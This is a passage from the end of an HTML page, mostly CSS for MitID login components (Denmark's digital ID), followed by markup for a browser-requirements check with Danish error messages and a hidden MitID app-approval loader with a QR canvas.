                margin-bottom: 1rem;
                caret-color: #0060e6;
            }
            .mitid-core-user__user-id:hover,
            .mitid-core-user__user-id:active,
            .mitid-core-user__user-id:focus {
                border: 2px solid #0060e6;
                background: #fff;
                position: relative;
                right: 1px;
            }
            .mitid-core-user__user-id:hover:not(:focus) {
                position: relative;
                opacity: 1;
            }
            .mitid-core-user__user-id:-ms-input-placeholder {
                font-weight: 500 !important;
                color: #333 !important;
                opacity: 1;
            }
            .mitid-core-user__user-id::placeholder {
                font-weight: 500 !important;
                color: #333 !important;
                opacity: 1;
            }
            .mitid-core-user__user-id:-ms-input-placeholder {
                font-weight: 500 !important;
                color: #333 !important;
            }
            .mitid-core-user__user-id::-ms-input-placeholder {
                font-weight: 500 !important;
                color: #333 !important;
            }
            .mitid-core-user__user-id::-ms-clear,
            .mitid-core-user__user-id::-ms-reveal {
                display: none;
            }
            .mitid-core-user__user-id:focus {
                background: rgba(0, 96, 230, 0.05) !important;
                border: 2px solid #0060e6 !important;
                position: relative;
                right: 1px;
            }
            .mitid--button-primary {
                margin-bottom: 0.5rem;
                color: #fff;
            }
            .mitid--button-primary[showicontext^="Icon Help Text"] {
                visibility: hidden;
                pointer-events: none;
                position: absolute;
                width: 0;
                height: 0;
            }
            .mitid--button-primary[showicontext^="Icon Help Text"] * {
                visibility: hidden;
            }
            .mitid--button-primary[showicontext^="Icon HelpﾠText"] {
                display: none;
                pointer-events: none;
                position: absolute;
            }
            .mitid--button-primary[showicontext^="Icon HelpﾠText"] * {
                visibility: hidden;
            }
            .mitid--button-primary[showicontext^="IconﾠHelpﾠText"] {
                display: inline-flex;
                visibility: visible;
                pointer-events: all;
            }
            .mitid--button-primary[showicontext^="IconﾠHelpﾠText"]:disabled {
                display: inline-flex;
                opacity: 0.2;
            }
            .mitid-core-icon--auth {
                display: inline-block;
                width: 1.5rem;
                height: 1.5rem;
                background-repeat: no-repeat;
                position: relative;
                top: 7px;
            }
            .mitid-core-icon--margin-right {
                margin-right: 8px;
            }
            .mitid-link {
                display: inline-flex;
                cursor: pointer;
                position: relative;
                left: -5px;
                border-radius: 4px;
                text-decoration: none;
                min-height: 1.5rem;
                padding: 0 0.25rem;
                padding-left: 2.188rem;
            }
            .mitid-link:hover .mitid-link__label,
            .mitid-link:focus .mitid-link__label {
                text-decoration: underline;
                color: #004cb8;
            }
            .mitid-link:focus:is(:focus-visible) {
                box-shadow: 0 0 0 3px #0060e6;
            }
            .mitid-link:active .mitid-link__label {
                color: #00398a;
                text-decoration: underline;
            }
            .mitid-link:hover .mitid-link__icon > path,
            .mitid-link:focus .mitid-link__icon > path {
                fill: #004cb8;
            }
            .mitid-link:hover .mitid-link__icon > g path:last-child,
            .mitid-link:focus .mitid-link__icon > g path:last-child {
                fill: #004cb8;
            }
            .mitid-link:active .mitid-link__icon > path {
                fill: #00398a;
            }
            .mitid-link:active .mitid-link__icon > g path:last-child {
                fill: #00398a;
            }
            .mitid-link__icon {
                margin-right: 0;
                position: absolute;
                top: 0.8px;
                left: 2px;
                height: 1.5rem;
                width: 1.5rem;
                display: flex;
                align-items: center;
                justify-content: center;
                cursor: pointer;
            }
            .mitid-link__icon svg {
                cursor: pointer;
            }
            .mitid-link__icon > path {
                fill: #0060e6;
                cursor: pointer;
            }
            .mitid-link__icon > g path:last-child {
                fill: #0060e6;
            }
            .mitid-link__label {
                max-width: 100%;
                cursor: pointer;
                font-weight: 600;
                color: #0060e6;
                text-decoration: none;
                letter-spacing: 0.2px;
                word-break: break-word;
                word-wrap: break-word;
            }
            .mitid-link:after {
                content: "";
                min-height: inherit;
                font-size: 0;
            }
            .mitid-link--vertical-align {
                margin-left: 0.25rem;
                color: #0060e6;
            }
            .mitid-link--vertical-align .mitid-core-text-button__icon {
                margin-right: 0.438rem;
            }
            .mitid-link--vertical-align .mitid-core-text-button__icon > path {
                fill: #0060e6;
            }
            .mitid-link--vertical-align .mitid-core-text-button__icon > g path:last-child {
                fill: #0060e6;
            }
            .mitid-tooltip {
                width: 100%;
            }
            .mitid-tooltip--context-help {
                position: absolute;
                left: 0.125rem;
                top: 10rem;
            }
            .mitid-tooltip--labeltextleft h2,
            .mitid-tooltip--iconandlabeltextleft h2,
            .mitid-tooltip--headertextcentered h2 {
                margin: 0 auto;
            }
            .mitid-tooltip--labeltextleft i {
                display: none;
            }
            .mitid-tooltip--headertextcentered .mitid-tooltip__label {
                display: flex;
                padding-bottom: 1.5rem;
            }
            .mitid-tooltip--headertextcentered .mitid-tooltip__label label {
                width: 100%;
                font-size: 1.25rem;
                line-height: 1.75rem;
                text-align: center;
                text-transform: none;
            }
            .mitid-tooltip--headertextcentered .mitid-tooltip__label i {
                display: none;
            }
            .mitid-tooltip__label {
                display: inline-flex;
                align-items: center;
                padding-bottom: 0.5rem;
            }
            .mitid-tooltip__text {
                font-weight: 600;
                font-size: 0.875rem;
                line-height: 1.5rem;
                text-transform: uppercase;
                letter-spacing: 0.2px;
            }
            .mitid--button-icon-tooltip:hover path,
            .mitid--button-icon-tooltip:focus path {
                fill: #0060e6;
            }
            .mitid--button-icon-tooltip:active path {
                fill: #00398a;
            }
            .mitid--button-icon-tooltip:focus:is(:focus-visible) svg {
                background-color: #fff;
                border-radius: 0.25rem;
                box-shadow: 0px 0px 0px 2px #fff, 0px 0px 0px 5px #0060e6;
            }
            .mitid--button-icon-tooltip {
                -webkit-appearance: none;
                appearance: none;
                width: 2.75rem;
                cursor: pointer;
                overflow: visible;
                background-color: #fff;
                display: flex;
                align-items: center;
                justify-content: center;
                background-color: rgba(0, 0, 0, 0);
            }
            .mitid--button-icon-tooltip svg {
                height: 1rem;
                width: 1rem;
                cursor: pointer;
            }
            .mitid--button-icon-tooltip path {
                fill: #001c44;
                cursor: pointer;
            }
            .mitid-core-close {
                display: block;
            }
            .mitid-core-close button {
                width: 2.75rem;
                height: 2.75rem;
                padding: 0;
                box-sizing: content-box;
                outline: none;
                display: flex;
                align-items: center;
                justify-content: center;
                cursor: pointer;
            }
            .mitid-core-close button svg {
                height: 24px;
                width: 24px;
            }
            .mitid-core-close button svg path {
                fill: #001c44;
            }
            .mitid-core-close button:hover svg path {
                fill: #004cb8;
            }
            .mitid-core-close button:active path {
                fill: #00398a;
            }
            .mitid-core-close button:focus:is(:focus-visible) svg {
                border: 3px solid #0060e6;
                border-radius: 4px;
            }
            .mitid-core-close button:focus:is(:focus-visible) svg path {
                fill: #004cb8;
            }
            .mitid-core-close--corner {
                position: absolute;
                top: -8px;
                right: 0;
            }
            .mitid-core-overlay {
                position: absolute;
                top: 0px;
                left: -0.313rem;
                right: -0.313rem;
                bottom: 0px;
                background-color: rgba(255, 255, 255, 0.6);
                z-index: 2;
            }
            .mitid-core-overlay--inside {
                bottom: 40px;
                top: 42px;
            }
            .mitid-core-tooltip {
                color: #333;
                font-size: 1rem;
                left: 4px;
                letter-spacing: 0px;
                line-height: 1.5rem;
                font-weight: 400;
                font-style: normal;
                position: relative;
                padding: 0;
                text-decoration: none;
                color: #000;
                list-style: none;
                text-align: left;
                letter-spacing: 0px;
                z-index: 2000;
                display: block;
            }
            .mitid-core-tooltip__content {
                position: absolute;
                left: -4px;
                right: 4px;
                background-color: #fff;
                border-radius: 4px;
                box-shadow: 0px 0px 10px 0px rgba(0, 0, 0, 0.3);
                z-index: 1000;
                overflow: hidden;
            }
            .mitid-core-tooltip__info {
                left: -6px;
                right: 6px;
            }
            .mitid-core-tooltip .mitid-core-tooltip__header {
                display: flex;
                justify-content: space-between;
                margin: 0.5rem 0 0.5rem 1rem;
                position: relative;
            }
            .mitid-core-tooltip .mitid-core-tooltip__header h2 {
                margin: 0.438rem 0 0 0;
                max-width: 266px;
            }
            .mitid-core-tooltip__text {
                margin: 0 2rem 1rem 1rem;
                display: block;
            }
            .mitid-core-tooltip__link {
                display: block;
                position: relative;
                top: 0.313rem;
            }
            .mitid-core-authenticator {
                display: flex;
                flex-direction: column;
                justify-content: stretch;
                height: 100%;
            }
            .mitid-core-authenticator__iframe {
                height: 100%;
                border: none;
                width: 104%;
                position: relative;
                left: -7px;
                flex: 1 1 auto;
            }
            .mitid-core-authenticator__iframe:focus {
                outline: none;
            }
            .mitid-core-authenticator__header {
                flex: 0 0 auto;
            }
            .mitid-authenticators {
                display: block;
            }
            .mitid-authenticators__list {
                background-color: #fff;
                border: 1px solid #979797;
                border-radius: 4px;
                padding: 0;
                margin: 0 0 16px 0;
                display: block;
            }
            .mitid-authenticators__item {
                margin: 0;
                width: 100%;
                display: flex;
                align-items: center;
                color: #001c44;
                background-color: #fff;
                padding: 0 0 0 1rem;
                border: 2px solid rgba(0, 0, 0, 0) !important;
                box-sizing: border-box;
                cursor: pointer;
            }
            .mitid-authenticators__item:nth-child(1),
            .mitid-authenticators__item:last-of-type {
                border-radius: 3px;
            }
            .mitid-authenticators__item::-moz-focus-inner {
                border: 0;
            }
            .mitid-authenticators__item:active span {
                position: relative;
                top: 0;
            }
            .mitid-authenticators__item i {
                position: relative;
                top: 0;
                margin-right: 0.5rem;
                font-style: normal;
                outline: none;
            }
            .mitid-authenticators__item:nth-child(1) {
                border-radius: 4px 4px 0 0;
            }
            .mitid-authenticators__item:last-of-type {
                border-radius: 0 0 4px 4px;
            }
            .mitid-authenticators__item:hover {
                background-color: #f2f7fe;
            }
            .mitid-authenticators__item:hover .mitid-authenticators__name {
                color: #0060e6;
            }
            .mitid-authenticators__item:hover path {
                fill: #0060e6;
            }
            .mitid-authenticators__item:active span {
                position: relative;
                top: 0;
            }
            .mitid-authenticators__item:focus {
                outline: none;
                background-color: #f2f7fe;
                box-shadow: 0 2px #0060e6 inset, 0 -2px #0060e6 inset, -2px 0 #0060e6 inset, 2px 0 #0060e6 inset;
            }
            .mitid-authenticators__item:focus path {
                fill: #0060e6;
            }
            .mitid-authenticators__item:focus .mitid-authenticators__name {
                color: #0060e6;
            }
            .mitid-authenticators__name {
                font-weight: 600;
                padding: 10px 0;
                max-width: 272px;
                cursor: pointer;
            }
            .mitid-authenticators__name:nth-of-type(1):not(:last-child):after {
                content: "+";
                font-size: 1rem;
                position: relative;
                padding-left: 4px;
                padding-right: 4px;
            }
            .mitid-authenticators--selected {
                background-color: #00398a !important;
                border-radius: 0;
                box-shadow: -1px 0 0 0 #00398a, 1px 0 0 0 #00398a;
                cursor: default;
            }
            .mitid-authenticators--selected .mitid-authenticators__name {
                color: #fff;
            }
            .mitid-authenticators--selected path {
                fill: #fff !important;
            }
            .mitid-authenticators--selected:nth-child(1) {
                border-radius: 4px 4px 0 0;
                box-shadow: 0 -1px #00398a, -1px 0 #00398a, 1px 0 #00398a;
            }
            .mitid-authenticators--selected:last-of-type {
                border-radius: 0 0 4px 4px;
                box-shadow: -1px 0 #00398a, 1px 0 #00398a, -1px 1px #00398a, 1px 1px #00398a;
            }
            .mitid-authenticators--selected:last-of-type:active span {
                position: relative;
                top: 0;
            }
            .mitid-authenticators--selected:hover .mitid-authenticators__name {
                color: #fff;
                cursor: default;
            }
            .mitid-authenticators--selected:focus {
                box-shadow: 0 -2px #fff inset, -2px 0 #fff inset, 2px 0 #fff inset, -1px 1px #00398a, 1px 1px #00398a, -1px -1px #00398a, 1px -1px #00398a, 0 2px 0 0 #fff inset;
            }
            .mitid-authenticators--selected:focus .mitid-authenticators__name {
                color: #fff;
            }
            .mitid-authenticators--selected:focus:nth-child(1) {
                border-radius: 4px 4px 0 0;
                box-shadow: 0 2px #fff inset, 0 -2px #fff inset, -2px 0 #fff inset, 2px 0 #fff inset, -1px 1px #00398a, 0 -1px #00398a, -1px 0 #00398a, 1px 1px #00398a;
            }
            .mitid-authenticators--selected:focus:last-of-type {
                border-radius: 0 0 4px 4px;
                box-shadow: 0 2px #fff inset, 0 -2px #fff inset, -2px 0 #fff inset, 2px 0 #fff inset, -1px 1px #00398a, 1px 1px #00398a, -1px -1px #00398a, 1px -1px #00398a;
            }
            .mitid-core-reference-text {
                margin-bottom: 1rem;
                flex: 0 0 auto;
                display: block;
            }
            .mitid-checkbox {
                -webkit-appearance: none;
                appearance: none;
                display: block;
                position: relative;
                padding-left: 2.188rem;
                max-width: 300px;
                cursor: pointer;
                margin-top: 0.5rem;
            }
            .mitid-checkbox__label {
                overflow: hidden;
                display: block;
                cursor: pointer;
                font-weight: 600;
                color: #001c44;
                word-break: break-word;
                word-wrap: break-word;
            }
            .mitid-checkbox__input {
                position: absolute;
                opacity: 0;
                cursor: pointer;
                height: 1.5rem;
                width: 1.5rem;
                top: 0;
                left: 0;
            }
            .mitid-checkbox__checkmark {
                position: absolute;
                top: 0;
                left: 0;
                height: 1.5rem;
                width: 1.5rem;
                background-repeat: no-repeat;
                background-position: center;
                display: flex;
                align-items: center;
                justify-content: center;
                cursor: pointer;
            }
            .mitid-checkbox__checker {
                width: 18px;
                height: 18px;
                display: block;
                border: #001c44 solid 2px;
                border-radius: 3px;
                box-sizing: border-box;
                cursor: pointer;
            }
            .mitid-checkbox__input:checked ~ .mitid-checkbox__checkmark > .mitid-checkbox__checker {
                border-color: #0060e6;
            }
            .mitid-checkbox__input:focus ~ .mitid-checkbox__checkmark {
                box-shadow: 0 0 0 3px #0060e6;
                border-radius: 4px;
            }
            .mitid-checkbox__input:not(:checked):focus ~ .mitid-checkbox__checkmark > .mitid-checkbox__checker {
                border-color: #0060e6;
            }
            .mitid-checkbox__input:checked ~ .mitid-checkbox__checkmark > .mitid-checkbox__checker {
                position: relative;
                background-size: 18px 18px;
                border: none !important;
                background-color: #0060e6;
            }
            .mitid-checkbox__input:checked ~ .mitid-checkbox__checkmark > .mitid-checkbox__checker::after {
                content: " ";
                transform-origin: left top;
                border-right: 2px solid #fff;
                border-top: 2px solid #fff;
                left: 2px;
                top: 9px;
                height: 10px;
                width: 5px;
                position: absolute;
                transform: scaleX(-1) rotate(135deg);
            }
            .mitid-checkbox:hover .mitid-checkbox__input:not(:checked) ~ .mitid-checkbox__checkmark > .mitid-checkbox__checker {
                border-color: #0060e6;
            }
            .mitid-checkbox--no-margin {
                margin: 0;
            }
            .mitid-core-terms {
                display: flex;
                flex-direction: column;
                height: 100%;
                justify-content: stretch;
                position: relative;
            }
            .mitid-core-terms__summary {
                z-index: 1;
            }
            .mitid-core-terms__content p {
                display: block;
                margin-top: 0.313rem;
            }
            .mitid-core-terms__actions {
                margin: 1.5rem 0;
                min-height: 5.5rem;
                display: flex;
                flex-direction: column;
                justify-content: space-between;
            }
            .mitid-core-terms__continue {
                height: 3.85rem;
            }
            .mitid-core-terms__label {
                overflow: hidden;
                display: block;
                font-weight: 600;
                color: #001c44;
            }
            .mitid-notification {
                height: 100%;
            }
            .mitid-notification__content {
                padding: 16px 16px 12px 56px;
                position: relative;
                margin-bottom: 1rem;
                display: block;
                overflow: hidden;
            }
            .mitid-notification--info {
                background-color: #f2f7fe;
                border: 1px solid rgba(0, 96, 230, 0.2);
            }
            .mitid-notification--info:before {
                content: " ";
                background-image: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24'%3e%3cpath fill='%230060e6' d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z'/%3e%3c/svg%3e");
                position: absolute;
                display: block;
                width: 24px;
                height: 24px;
                left: 16px;
                float: left;
            }
            .mitid-notification--info:before path {
                fill: #0060e6;
            }
            .mitid-notification--warning {
                background-color: #fffbf2;
                border: 1px solid rgba(254, 171, 0, 0.2);
            }
            .mitid-notification--warning:before {
                content: " ";
                background-image: url("data:image/svg+xml,%3c%3fxml version='1.0' encoding='UTF-8'%3f%3e%3csvg xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='24px' height='24px' version='1.1' viewBox='0 0 64 64'%3e%3ctitle%3eF7BD9E59-0FBF-4F1C-98E3-A2E0D17E6185%401.00x%3c/title%3e%3cg id='Components' fill='none' fill-rule='evenodd' stroke='none' stroke-width='1'%3e%3cg id='Iconography' transform='translate(-357.000000%2c -914.000000)'%3e%3cg id='checkbox-/-01-enabled' transform='translate(357.000000%2c 914.000000)'%3e%3cg id='notification'%3e%3cg id='icon'%3e%3cg id='icons/alert/error_outline'%3e%3cg id='error'%3e%3crect id='%23' width='24' height='24' x='0' y='0'/%3e%3cpath id='Shape' fill='%23FEAB00' d='M32%2c5.33333333 C17.28%2c5.33333333 5.33333333%2c17.28 5.33333333%2c32 C5.33333333%2c46.72 17.28%2c58.6666667 32%2c58.6666667 C46.72%2c58.6666667 58.6666667%2c46.72 58.6666667%2c32 C58.6666667%2c17.28 46.72%2c5.33333333 32%2c5.33333333 Z'/%3e%3cpath id='Path' fill='black' d='M32%2c34.6666667 C30.5333333%2c34.6666667 29.3333333%2c33.4666667 29.3333333%2c32 L29.3333333%2c21.3333333 C29.3333333%2c19.8666667 30.5333333%2c18.6666667 32%2c18.6666667 C33.4666667%2c18.6666667 34.6666667%2c19.8666667 34.6666667%2c21.3333333 L34.6666667%2c32 C34.6666667%2c33.4666667 33.4666667%2c34.6666667 32%2c34.6666667 Z'/%3e%3cpolygon id='Path' fill='black' points='34.6666667 45.3333333 29.3333333 45.3333333 29.3333333 40 34.6666667 40'/%3e%3c/g%3e%3c/g%3e%3c/g%3e%3c/g%3e%3c/g%3e%3c/g%3e%3c/g%3e%3c/svg%3e");
                position: absolute;
                display: block;
                width: 24px;
                height: 24px;
                left: 16px;
                float: left;
            }
            .mitid-notification--error {
                background-color: #fdf2f2;
                border: 1px solid rgba(218, 0, 0, 0.2);
            }
            .mitid-notification--error:before {
                content: " ";
                background-image: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24'%3e%3cpath fill='%23da0000' fill-rule='evenodd' d='M4.47 21h15.06c1.54 0 2.5-1.67 1.73-3L13.73 4.99c-.77-1.33-2.69-1.33-3.46 0L2.74 18c-.77 1.33.19 3 1.73 3zM12 14c-.55 0-1-.45-1-1v-2c0-.55.45-1 1-1s1 .45 1 1v2c0 .55-.45 1-1 1zm1 4h-2v-2h2v2z'/%3e%3c/svg%3e");
                position: absolute;
                display: block;
                width: 24px;
                height: 24px;
                left: 16px;
                float: left;
            }
            .mitid-notification__message,
            .mitid-notification__support {
                display: block;
            }
            .mitid-core-section,
            .mitid-core-section__help-context {
                flex: 1 1 auto;
                display: flex;
                flex-direction: column;
                position: relative;
            }
            .mitid-checkbox_user-id {
                margin-bottom: 1.1rem;
                margin-top: 2rem;
            }
            .mitid-core-switch {
                display: flex;
                align-items: center;
            }
            @media screen and (max-width: 399px) {
                .mitid-core-switch {
                    margin-left: 0.313rem;
                }
            }
            .mitid-core-content {
                width: 100%;
                margin: 0;
                position: relative;
                display: flex;
                flex-direction: column;
                box-sizing: content-box;
                z-index: 1;
                flex: 1 0 auto;
                justify-content: stretch;
            }
            .mitid-spinner {
                position: absolute;
                height: 5px;
                width: 100%;
                left: 0;
                top: 0;
                overflow: hidden;
                z-index: 100;
                display: block;
            }
            .mitid-spinner__spin {
                background-color: #0060e6;
                width: 225px;
                height: 4px;
                position: relative;
                animation-name: mitid-spinner;
                animation-duration: 2s;
                animation-iteration-count: infinite;
                display: block;
            }
            @keyframes mitid-spinner {
                0% {
                    left: -225px;
                    top: 0px;
                }
                100% {
                    left: 100%;
                    top: 0px;
                }
            }
            .mitid-core-help {
                position: absolute;
                z-index: 1000;
                background-color: #fff;
                border-radius: 4px;
                box-shadow: 0 5px 14px 3px rgba(0, 0, 0, 0.2);
                bottom: 2rem;
                padding: 0.5rem 0.5rem 0.5rem 1rem;
                width: 336px;
                box-sizing: border-box;
                left: -2px;
            }
            @media screen and (max-width: 399px) {
                .mitid-core-help {
                    bottom: 44px;
                }
            }
            .mitid-core-help .mitid--divider-light,
            .mitid-core-help .mitid--divider {
                max-width: 19rem;
                margin: 0.5rem 0;
            }
            .mitid-core-help__header {
                display: flex;
                align-items: center;
                height: 2.5rem;
            }
            .mitid-core-help__header .mitid-core-help__header-text {
                flex: 1 1 100%;
                margin: 0;
            }
            .mitid-core-help__menu {
                padding: 0;
                margin: 0;
                list-style: none;
                display: inline-block;
                width: 100%;
                height: 100%;
            }
            .mitid-core-help__menu-item {
                flex: 1;
                margin: 0;
                padding: 0.5625rem 1.5rem 0.5625rem 0;
                display: flex;
                align-items: center;
            }
            .mitid-core-help__link-divider {
                margin-top: 0.5rem;
                margin-bottom: 0.438rem;
            }
            @media screen and (max-width: 399px) {
                .mitid-core-help {
                    width: 97%;
                    margin: 0 5px;
                    min-width: 266px;
                }
            }
            .mitid-core-finalize {
                position: relative;
                display: flex;
                align-items: center;
                justify-content: center;
                height: 100%;
                min-height: 300px;
                flex-direction: column;
                flex: 1 1 auto;
            }
            @media screen and (max-height: 520px) {
                .mitid-core-finalize {
                    justify-content: flex-start;
                }
            }
            .mitid-core-finalize__logo {
                height: 24px;
                position: relative;
                width: 62px;
                margin-bottom: 24px;
            }
            .mitid-core-finalize__logo-svg {
                position: absolute;
                left: -85px;
                top: -20px;
                height: 62px;
                width: 234px;
                transform: scale(0.26);
            }
            .mitid-core-finalize__logo-svg path {
                fill: #0060e6;
            }
            .mitid-core-finalize__shield {
                position: absolute;
                width: 100px;
                height: 117px;
            }
            .mitid-core-finalize__shield path {
                fill: #0060e6;
            }
            .mitid-core-finalize__state {
                position: relative;
                height: 120px;
                width: 100px;
                margin-bottom: 24px;
                display: block;
            }
            .mitid-core-finalize__title {
                font-size: 1.25rem;
                font-weight: 700;
                line-height: 1.75rem;
                display: block;
                text-align: center;
                height: 60px;
            }
            .mitid-core-finalize__done:after {
                opacity: 0;
                height: 34px;
                width: 14px;
                transform-origin: left top;
                border-right: 4px solid #fff;
                border-top: 4px solid #fff;
                content: "";
                left: 32px;
                top: 55px;
                position: absolute;
                animation-duration: 800ms;
                animation-delay: 100ms;
                animation-timing-function: ease-in;
                animation-name: checkmark;
                animation-fill-mode: forwards;
                transform: scaleX(-1) rotate(135deg);
            }
            @keyframes checkmark {
                0% {
                    height: 0;
                    width: 0;
                    opacity: 1;
                }
                20% {
                    height: 0;
                    width: 14px;
                    opacity: 1;
                }
                35% {
                    height: 34px;
                    width: 14px;
                    opacity: 1;
                }
                100% {
                    height: 34px;
                    width: 14px;
                    opacity: 1;
                }
            }
            .mitid-core-client {
                overflow-y: auto;
                overflow-x: hidden;
                justify-content: stretch;
                flex-direction: column;
            }
            @media screen and (max-width: 399px), (max-height: 520px) {
                .mitid-core-client {
                    height: 588px !important;
                }
            }
        </style>
    </head>
    <body class="body-container" class="center">
        <center>
            <main class="page-section main-section">
                <div id="browserDetectorWrapper">
                    <div id="ContentPlaceHolder_BrowserMinimumRequirementsDetector">
                        <div id="detectorContent" class="browserDetectorWrapper" style="display: none;">
                            <div id="browserErrorMessageHeader" style="display: none;"><h2>Browser konfigurerings fejl.</h2></div>
                            <div id="cookieError" style="display: none;"><p>Denne hjemmeside kræver cookies. Slå cookies til i din browser.</p></div>
                            <div id="javascriptError" style="display: none;">
                                <p>Javascript skal være aktiveret i din browser. Aktiver Javascript i din browsers indstillinger og prøv igen. Det kan være nødvendigt at genstarte din browser.</p>
                            </div>
                            <div id="isBlockedError" style="display: none;"><p></p></div>
                        </div>
                        <span id="fade" class="black_overlay" style="display: none;"></span>
                    </div>
                </div>

                <div>
                    <div id="ContentPlaceHolder_MitIDDiv">
                        <div id="coreClientParent">
                            <main id="mitId" class="mitid-loader" style="display: none; height: 588px; width: 400px; font-family: 'IBM Plex Sans', Arial, Helvetica, FreeSans, sans, sans-serif;">
                                <div class="mitid-loader__content" aria-busy="true" aria-live="polite">
                                    <div class="mitid-loader__logo">
                                        <svg xmlns="http://www.w3.org/2000/svg" width="61" height="16" viewBox="0 0 61 16" focusable="false" aria-label="MitID logo" class="mitid-loader__logo-svg">
                                            <path
                                                d="M19.2,0c1,0,1.8,0.8,1.8,1.8c0,1-0.8,1.8-1.8,1.8c-1,0-1.8-0.8-1.8-1.8C17.4,0.8,18.2,0,19.2,0z M40.4,0 c2.1,0,3.8,1.7,3.8,3.8c0,2.1-1.7,3.8-3.8,3.8c-2.1,0-3.8-1.7-3.8-3.8C36.6,1.7,38.3,0,40.4,0z M20.7,4.9v10.9h-3V4.9H20.7z M2.9,0.8l4.6,7.1l4.5-7.1h2.9v15h-3.1V6.1l-4.3,6.4H7.4L3.1,6.1v9.7H0v-15H2.9z M40.4,9c3.6,0,6.5,2,6.9,6.8H33.6 C34,11,36.9,9,40.4,9z M51.9,0.2C58.3,0.2,61,3.7,61,8c0,4.3-2.7,7.8-9.1,7.8h-2.6V0.2H51.9z M27.1,1.9v3h2.4v2.4h-2.4v4.8 c0,0.9,0.5,1.2,1.3,1.2c0.5,0,1-0.1,1.3-0.4v2.7c-0.4,0.2-1.2,0.3-2,0.3c-2.2,0-3.6-1.1-3.6-3.5V7.3h-1.7V4.9h1.7v-3H27.1z"
                                            ></path>
                                        </svg>
                                    </div>
                                    <div class="mitid-loader__text">
                                        <h1 class="mitid-loader__title" aria-live="assertive">Åbn MitID app og godkend</h1>
                                    </div>
                                    <div>
                                        <object _ngcontent-pjp-c1="" type="image/svg+xml" id="code-app-emulator" class="code-app-emulator" data="codeappslideremulator.svg">
                            <img _ngcontent-pjp-c1="" alt="code-app-emulator" class="code-app-emulator" src="codeappslideremulator.svg" />
                        </object>
                        <canvas _ngcontent-pjp-c1="" id="channel-binding-qr" class="code-app-emulator"></canvas>
                                    </div>
                                </div>
                            </main>
                        </div>
                    </div>
                </div>
            </main>
        </center>
    </body>
</html>